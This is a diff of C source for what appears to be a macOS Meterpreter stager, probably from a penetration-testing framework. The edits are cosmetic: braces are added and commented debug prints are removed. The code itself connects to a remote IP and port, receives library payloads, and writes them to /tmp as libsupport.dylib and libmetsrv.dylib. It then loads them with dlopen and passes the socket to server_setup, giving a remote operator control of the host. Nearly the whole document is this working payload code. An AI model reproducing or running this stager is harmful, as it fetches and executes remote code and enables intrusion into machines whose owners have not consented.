@@ -49,7 +49,9 @@ int get_socket(char* ip, int port)
     struct sockaddr_in serv_addr; 
 
     if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+    {
         return 0;
+    }
 
     memset(&serv_addr, '0', sizeof(serv_addr)); 
 
@@ -57,10 +59,14 @@ int get_socket(char* ip, int port)
     serv_addr.sin_port = htons(port); 
 
     if(inet_pton(AF_INET, ip, &serv_addr.sin_addr)<=0)
+    {
         return 0;
+    }
 
     if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
+    {
         return 0;
+    }
 
     return sockfd;
 }
@@ -70,21 +76,21 @@ char* get_library(int socket, int* size)
     int buffer_len=0, bytes_recv, received=0;
 
     bytes_recv = read(socket, (char*)&buffer_len, 4);
-    if (bytes_recv != 4 || buffer_len <= 0)     
+    if (bytes_recv != 4 || buffer_len <= 0)
+    {     
         exit(1);
+    }
 
-    //printf("Recieved: %d bytes\n", bytes_recv);    
-    //printf("Stage length: %d bytes\n", buffer_len);
-  
     char* buffer = (char*)malloc(buffer_len);
     if (!buffer)
+    {
         exit(1);
+    }
 
     while (received < buffer_len)
     {
         bytes_recv = read(socket, buffer+received, buffer_len-received);
         received += bytes_recv;
-        //printf("Recieved: %d bytes\n", bytes_recv);
     }
 
     *size = buffer_len;
@@ -95,21 +101,23 @@ void write_to_file(char* path, char* buffer, int size)
 {
     FILE* file = fopen(path, "w");
     int i;
-    for (i=0; i<size; i++)
+    for (i = 0; i < size; i++)
+    {
         fprintf(file, "%c", *(buffer+i));
+    }
     fclose(file);
 }
 
 int main()
 {
     char* ip = trim(ip_str + 4);
-    //printf("%s\n", ip);
     char* port = trim(port_str+4);
-    //printf("%s\n", port);
 
     int socket = get_socket(ip, atoi(port));
     if (!socket)
+    {
         exit(1);
+    }
 
     int libraries_size;
     read(socket, (char*)&libraries_size, 4);
@@ -124,11 +132,14 @@ int main()
     void* libsupport_hande = dlopen("/tmp/libsupport.dylib", RTLD_NOW | RTLD_LOCAL);
     void* libmetsrv_handle = dlopen("/tmp/libmetsrv.dylib", RTLD_NOW | RTLD_LOCAL);
 
-    if (libmetsrv_handle) {
+    if (libmetsrv_handle) 
+    {
         int (*server_setup)(int);
         server_setup = dlsym(libmetsrv_handle, "server_setup");
         if (server_setup)
+        {
             return server_setup(socket);
+        }
     }
 
     free(libsupport_buffer);
